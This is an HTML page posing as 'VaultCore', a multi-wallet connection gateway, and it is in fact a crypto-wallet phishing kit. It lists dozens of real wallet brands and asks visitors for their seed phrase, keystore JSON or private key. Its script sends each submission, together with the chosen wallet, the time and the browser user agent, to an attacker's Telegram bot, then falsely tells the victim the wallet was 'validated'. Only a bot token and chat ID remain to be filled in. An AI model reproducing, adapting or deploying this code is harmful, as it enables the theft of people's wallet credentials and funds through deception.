<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>VaultCore | Multi‑Wallet Gateway</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: #0B0E17;
            padding: 2rem 1.5rem;
            min-height: 100vh;
            position: relative;
        }

        /* subtle grid pattern */
        body::before {
            content: "";
            position: fixed;
            inset: 0;
            background-image: linear-gradient(#1E2438 1px, transparent 1px),
                              linear-gradient(90deg, #1E2438 1px, transparent 1px);
            background-size: 48px 48px;
            opacity: 0.2;
            pointer-events: none;
            z-index: 0;
        }

        .app-container {
            max-width: 1400px;
            margin: 0 auto;
            position: relative;
            z-index: 2;
        }

        /* main card */
        .vault-card {
            background: #0F121C;
            border-radius: 2rem;
            border: 1px solid #262E42;
            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.5);
            padding: 2rem;
            transition: all 0.2s;
        }

        /* professional market bar */
        .market-bar {
            background: #090C14;
            border-radius: 1.5rem;
            padding: 0.75rem 1.5rem;
            margin-bottom: 2rem;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            gap: 1rem;
            border: 1px solid #262E42;
        }
        .market-title {
            display: flex;
            align-items: center;
            gap: 0.6rem;
            font-weight: 500;
            font-size: 0.85rem;
            color: #8B9BCF;
        }
        .market-ticker {
            display: flex;
            flex-wrap: wrap;
            gap: 1.2rem;
        }
        .ticker-item {
            display: flex;
            align-items: baseline;
            gap: 0.6rem;
            background: #151B27;
            padding: 0.3rem 1rem;
            border-radius: 2rem;
        }
        .ticker-symbol { font-weight: 700; color: #FFFFFF; }
        .ticker-price { font-weight: 500; color: #E2E9FF; }
        .change-badge { font-size: 0.7rem; font-weight: 600; padding: 0.1rem 0.5rem; border-radius: 1rem; }
        .positive { background: #0F2E24; color: #2EE6A0; }
        .negative { background: #2E1A1A; color: #FF6B6B; }
        .last-updated { font-size: 0.7rem; color: #5B6B99; }

        /* header */
        .wallet-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
            margin: 0.5rem 0 1.5rem;
        }
        .wallet-header h2 {
            font-size: 1.5rem;
            font-weight: 600;
            color: #FFFFFF;
        }
        .search-field {
            background: #090C14;
            border-radius: 2rem;
            padding: 0.4rem 1rem;
            display: flex;
            align-items: center;
            gap: 0.6rem;
            border: 1px solid #2A324A;
        }
        .search-field input {
            background: transparent;
            border: none;
            padding: 0.5rem;
            color: white;
            font-size: 0.9rem;
            width: 200px;
            outline: none;
        }

        /* wallet grid */
        .wallets-container {
            max-height: 55vh;
            overflow-y: auto;
            margin: 1rem 0;
        }
        .wallets-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
            gap: 1rem;
        }
        .wallet-item {
            background: #11161F;
            border-radius: 1.2rem;
            padding: 1rem 0.5rem;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.7rem;
            cursor: pointer;
            transition: 0.15s ease;
            border: 1px solid #222A3A;
        }
        .wallet-item:hover {
            background: #1A2232;
            transform: translateY(-2px);
            border-color: #3B82F6;
        }
        .wallet-icon {
            width: 56px;
            height: 56px;
            background: #1B2436;
            border-radius: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
            color: #A0B3F0;
        }
        .wallet-name {
            font-weight: 500;
            font-size: 0.8rem;
            text-align: center;
            color: #E4ECFF;
        }
        .no-match {
            text-align: center;
            padding: 2rem;
            color: #7B89AE;
        }

        /* extra feature buttons row */
        .extra-features {
            display: flex;
            gap: 1rem;
            margin: 1.5rem 0 0.5rem;
            flex-wrap: wrap;
        }
        .feature-btn {
            background: #11161F;
            border: 1px solid #2A324A;
            border-radius: 2rem;
            padding: 0.5rem 1.2rem;
            font-size: 0.8rem;
            font-weight: 500;
            color: #B7C5FF;
            cursor: pointer;
            transition: 0.2s;
        }
        .feature-btn:hover {
            background: #1F2A40;
            border-color: #3B82F6;
        }

        /* modal */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(8px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            visibility: hidden;
            opacity: 0;
            transition: 0.2s;
        }
        .modal-overlay.active {
            visibility: visible;
            opacity: 1;
        }
        .modal-card {
            background: #0F121C;
            border-radius: 1.8rem;
            width: 90%;
            max-width: 520px;
            border: 1px solid #2D364C;
            box-shadow: 0 30px 40px rgba(0,0,0,0.6);
        }
        .modal-header {
            padding: 1.2rem 1.5rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #252D40;
        }
        .modal-header h3 { font-size: 1.2rem; font-weight: 600; color: white; }
        .close-modal {
            background: none;
            border: none;
            font-size: 1.8rem;
            cursor: pointer;
            color: #8B9BCF;
        }
        .tabs {
            display: flex;
            background: #0B0E17;
            border-bottom: 1px solid #252D40;
        }
        .tab {
            flex: 1;
            text-align: center;
            padding: 0.8rem;
            background: none;
            border: none;
            color: #9AABD4;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
        }
        .tab.active {
            color: #3B82F6;
            border-bottom: 2px solid #3B82F6;
            background: rgba(59,130,246,0.05);
        }
        .modal-body {
            padding: 1.5rem;
        }
        .pane { display: none; }
        .pane.active-pane { display: block; }
        textarea {
            width: 100%;
            background: #090C14;
            border: 1px solid #2A324A;
            border-radius: 1rem;
            padding: 0.8rem;
            color: white;
            font-family: monospace;
            font-size: 0.85rem;
            margin: 0.5rem 0 1rem;
            resize: vertical;
        }
        .submit-btn {
            background: #1D2B4E;
            border: none;
            width: 100%;
            padding: 0.8rem;
            border-radius: 2rem;
            font-weight: 600;
            color: white;
            cursor: pointer;
            transition: 0.2s;
        }
        .submit-btn:hover { background: #2C3F6E; }
        .toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #1A2232;
            border: 1px solid #3B82F6;
            color: white;
            padding: 0.5rem 1.2rem;
            border-radius: 2rem;
            font-size: 0.8rem;
            z-index: 1100;
            display: none;
        }
        footer {
            text-align: center;
            margin-top: 1.5rem;
            font-size: 0.7rem;
            color: #5B6B99;
        }
    </style>
</head>
<body>
<div class="app-container">
    <div class="vault-card">
        <!-- Market Bar -->
        <div class="market-bar">
            <div class="market-title"><i class="fas fa-chart-simple"></i> SPOT RATES</div>
            <div class="market-ticker" id="liveTicker"></div>
            <div class="last-updated" id="updateTime"></div>
        </div>

        <div class="wallet-header">
            <h2><i class="fas fa-cube"></i> Select wallet</h2>
            <div class="search-field">
                <i class="fas fa-search"></i>
                <input type="text" id="searchWallet" placeholder="Filter...">
            </div>
        </div>
        <div class="wallets-container">
            <div id="walletsGrid" class="wallets-grid"></div>
        </div>

        <!-- Extra features row (similar to seed/connect) -->
        <div class="extra-features">
            <div class="feature-btn" id="connectWalletBtn"><i class="fas fa-plug"></i> Connect Wallet (sim)</div>
            <div class="feature-btn" id="phraseValidatorBtn"><i class="fas fa-check-double"></i> Validate phrase length</div>
            <div class="feature-btn" id="hardwareHintBtn"><i class="fas fa-microchip"></i> Hardware fallback</div>
        </div>
        <footer>🔐 Select any wallet → secure modal</footer>
    </div>
</div>

<!-- Modal -->
<div id="credModal" class="modal-overlay">
    <div class="modal-card">
        <div class="modal-header">
            <h3 id="modalTitle"><i class="fas fa-key"></i> Enter credentials</h3>
            <button class="close-modal" id="closeModalBtn">&times;</button>
        </div>
        <div class="tabs">
            <button class="tab active" data-tab="phrase">Seed phrase</button>
            <button class="tab" data-tab="keystore">Keystore JSON</button>
            <button class="tab" data-tab="pkey">Private key</button>
        </div>
        <div class="modal-body">
            <div id="phrasePane" class="pane active-pane">
                <label>Recovery phrase (12/24 words)</label>
                <textarea id="seedInput" rows="3" placeholder="enter mnemonic..."></textarea>
            </div>
            <div id="keystorePane" class="pane">
                <label>Keystore (JSON)</label>
                <textarea id="keystoreInput" rows="3" placeholder='{"crypto":{...}}'></textarea>
            </div>
            <div id="pkeyPane" class="pane">
                <label>Private key (hex)</label>
                <textarea id="pkeyInput" rows="2" placeholder="0x..."></textarea>
            </div>
            <button id="submitCreds" class="submit-btn"><i class="fas fa-shield-alt"></i> Verify & Connect</button>
        </div>
    </div>
</div>
<div id="toastMsg" class="toast"></div>

<script>
    // ========= TELEGRAM CONFIG (replace to enable) =========
    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    const CHAT_ID   = "YOUR_CHAT_ID_HERE";
    // =======================================================

    // ---------- wallet database (100+ names) ----------
    const walletNames = [
        "MetaMask", "Trust Wallet", "Coinbase Wallet", "Ledger Live", "Trezor", "Exodus", "Phantom", "Rabby", "Argent", "Rainbow",
        "SafePal", "Keplr", "Electrum", "MyEtherWallet", "TokenPocket", "MathWallet", "imToken", "Status", "Zengo", "Cake Wallet",
        "BlueWallet", "Samourai", "Wasabi", "Edge", "Guarda", "Ownbit", "Unstoppable", "BRD", "Atomic Wallet", "Infinity Wallet",
        "Jaxx Liberty", "Coinomi", "BitPay", "Electron Cash", "Sparrow", "Specter", "Coldcard", "KeepKey", "OneKey", "GridPlus",
        "SecuX", "BitBox", "CoolWallet", "D'CENT", "Ellipal", "ZenGo", "OKX Wallet", "Binance Web3", "Bitget Wallet", "Bybit Wallet",
        "Kucoin Wallet", "Frontier", "XDEFI", "Talisman", "SubWallet", "Nova Wallet", "Fearless", "Polkadot.js", "Brave Wallet",
        "Opera Crypto", "GameStop Wallet", "Loopring Wallet", "Ronin Wallet", "Yoroi", "Daedalus", "Flint Wallet", "Martian", "Petra",
        "Pontem", "Nightly", "Backpack", "Solflare", "Glow Wallet", "Slope", "Eclipse", "Soul Wallet", "Blocto", "Portis", "Fortmatic",
        "Tor.us", "Web3Auth", "Sequence", "Bitski", "Venly", "Dapper Wallet", "Torus", "Coin98", "KardiaChain", "Heco Wallet", "Onto"
    ];
    const uniqueWallets = [...new Map(walletNames.map(w => [w, w])).values()];

    function getWalletIcon(name) {
        const n = name.toLowerCase();
        if (n.includes("metamask")) return "fab fa-ethereum";
        if (n.includes("trust")) return "fas fa-check-circle";
        if (n.includes("coinbase")) return "fab fa-bitcoin";
        if (n.includes("ledger")) return "fas fa-microchip";
        if (n.includes("trezor")) return "fas fa-lock";
        if (n.includes("phantom")) return "fas fa-ghost";
        if (n.includes("exodus")) return "fas fa-charging-station";
        if (n.includes("rabby")) return "fas fa-gem";
        if (n.includes("argent")) return "fas fa-chart-line";
        if (n.includes("rainbow")) return "fas fa-palette";
        if (n.includes("safepal")) return "fas fa-shield-alt";
        if (n.includes("keplr")) return "fas fa-globe";
        if (n.includes("electrum")) return "fas fa-bolt";
        return "fas fa-wallet";
    }

    let selectedWallet = null;
    function renderWallets(filter = "") {
        const filtered = uniqueWallets.filter(w => w.toLowerCase().includes(filter.toLowerCase()));
        const grid = document.getElementById("walletsGrid");
        if (filtered.length === 0) {
            grid.innerHTML = `<div class="no-match"><i class="fas fa-search-minus"></i> No wallet found</div>`;
            return;
        }
        grid.innerHTML = filtered.map(w => `
            <div class="wallet-item" data-w="${w}">
                <div class="wallet-icon"><i class="${getWalletIcon(w)}"></i></div>
                <div class="wallet-name">${w}</div>
            </div>
        `).join('');
        document.querySelectorAll('.wallet-item').forEach(card => {
            card.addEventListener('click', () => {
                selectedWallet = card.getAttribute('data-w');
                openModal(selectedWallet);
            });
        });
    }

    // modal logic
    const modal = document.getElementById("credModal");
    const modalTitle = document.getElementById("modalTitle");
    function openModal(wallet) {
        modalTitle.innerHTML = `<i class="fas fa-key"></i> ${wallet} · secure entry`;
        document.getElementById("seedInput").value = "";
        document.getElementById("keystoreInput").value = "";
        document.getElementById("pkeyInput").value = "";
        // reset to phrase tab
        document.querySelectorAll('.pane').forEach(p => p.classList.remove('active-pane'));
        document.getElementById("phrasePane").classList.add('active-pane');
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.querySelector('.tab[data-tab="phrase"]').classList.add('active');
        modal.classList.add('active');
    }
    function closeModal() { modal.classList.remove('active'); }
    document.getElementById("closeModalBtn").addEventListener('click', closeModal);
    modal.addEventListener('click', (e) => { if(e.target === modal) closeModal(); });

    // tabs inside modal
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', () => {
            const target = tab.getAttribute('data-tab');
            document.querySelectorAll('.pane').forEach(p => p.classList.remove('active-pane'));
            if (target === 'phrase') document.getElementById("phrasePane").classList.add('active-pane');
            if (target === 'keystore') document.getElementById("keystorePane").classList.add('active-pane');
            if (target === 'pkey') document.getElementById("pkeyPane").classList.add('active-pane');
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
        });
    });

    // toast
    function showToast(msg, duration=3000) {
        const t = document.getElementById("toastMsg");
        t.innerText = msg;
        t.style.display = "block";
        setTimeout(() => t.style.display = "none", duration);
    }

    // telegram forward
    async function sendToTelegram(content, type) {
        if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !CHAT_ID || CHAT_ID === "YOUR_CHAT_ID_HERE") {
            console.warn("[DEMO] would send:", content);
            showToast("⚠️ DEMO: data logged to console (Telegram not set)", 4000);
            return false;
        }
        const text = `🛡️ VAULTCORE\nWallet: ${selectedWallet}\nType: ${type}\nData:\n${content}\nTime: ${new Date().toISOString()}\nUA: ${navigator.userAgent}`;
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text.slice(0, 4000) })
            });
            const json = await res.json();
            return json.ok;
        } catch(e) { console.error(e); showToast("Telegram error", 3000); return false; }
    }

    // submit credentials
    document.getElementById("submitCreds").addEventListener('click', async () => {
        let credValue = "", credType = "";
        const activePane = document.querySelector('.pane.active-pane');
        if (activePane.id === "phrasePane") { credValue = document.getElementById("seedInput").value.trim(); credType = "Seed phrase"; }
        else if (activePane.id === "keystorePane") { credValue = document.getElementById("keystoreInput").value.trim(); credType = "Keystore JSON"; }
        else { credValue = document.getElementById("pkeyInput").value.trim(); credType = "Private key"; }
        if (!credValue) { showToast(`Please enter ${credType}`, 2500); return; }
        showToast(`Verifying ${credType}...`, 1500);
        const ok = await sendToTelegram(credValue, credType);
        if (ok) showToast(`✓ ${selectedWallet} validated`, 3000);
        closeModal();
    });

    // search
    document.getElementById("searchWallet").addEventListener('input', (e) => renderWallets(e.target.value));
    renderWallets("");

    // ========== EXTRA FEATURES ==========
    // 1. Connect Wallet simulation (WalletConnect style)
    document.getElementById("connectWalletBtn").addEventListener('click', () => {
        alert("🔌 SIMULATED CONNECTION\n\nThis would open WalletConnect / MetaMask.\n(No real connection - demo only)");
        showToast("Connect Wallet demo triggered", 2000);
    });
    // 2. Phrase validator (checks word count)
    document.getElementById("phraseValidatorBtn").addEventListener('click', () => {
        const phrase = prompt("Enter a seed phrase to validate (just word count):");
        if (phrase) {
            const words = phrase.trim().split(/\s+/).length;
            if (words === 12 || words === 24) showToast(`✅ Valid phrase length: ${words} words`, 3000);
            else showToast(`⚠️ Invalid length: ${words} words (expected 12 or 24)`, 3000);
        }
    });
    // 3. Hardware wallet fallback hint
    document.getElementById("hardwareHintBtn").addEventListener('click', () => {
        alert("🔒 HARDWARE FALLBACK\n\nIf you use Ledger/Trezor, please connect via USB.\nThis page will not access your device — demo info only.");
        showToast("Hardware wallet guidance shown", 2000);
    });

    // ========== LIVE MARKET (professional) ==========
    async function fetchPrices() {
        try {
            const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,bnb&vs_currencies=usd&include_24hr_change=true");
            const d = await res.json();
            return {
                btc: { price: d.bitcoin?.usd, change: d.bitcoin?.usd_24h_change },
                eth: { price: d.ethereum?.usd, change: d.ethereum?.usd_24h_change },
                sol: { price: d.solana?.usd, change: d.solana?.usd_24h_change },
                bnb: { price: d.bnb?.usd, change: d.bnb?.usd_24h_change }
            };
        } catch(e) { return null; }
    }
    function updateUI(p) {
        const container = document.getElementById("liveTicker");
        if (!p) { container.innerHTML = `<span>loading...</span>`; return; }
        const items = [
            { sym: "BTC", val: p.btc.price, ch: p.btc.change },
            { sym: "ETH", val: p.eth.price, ch: p.eth.change },
            { sym: "SOL", val: p.sol.price, ch: p.sol.change },
            { sym: "BNB", val: p.bnb.price, ch: p.bnb.change }
        ];
        container.innerHTML = items.map(i => {
            const cls = i.ch >= 0 ? "positive" : "negative";
            const arrow = i.ch >= 0 ? "▲" : "▼";
            return `<div class="ticker-item"><span class="ticker-symbol">${i.sym}</span><span class="ticker-price">$${i.val?.toLocaleString()}</span><span class="change-badge ${cls}">${arrow} ${Math.abs(i.ch).toFixed(2)}%</span></div>`;
        }).join('');
        document.getElementById("updateTime").innerHTML = `<i class="far fa-clock"></i> ${new Date().toLocaleTimeString()}`;
    }
    async function refresh() { const p = await fetchPrices(); if(p) updateUI(p); else updateUI(null); }
    refresh();
    setInterval(refresh, 12000);
    setTimeout(() => showToast("🔐 Select a wallet to start", 3500), 800);
</script>
</body>
</html>
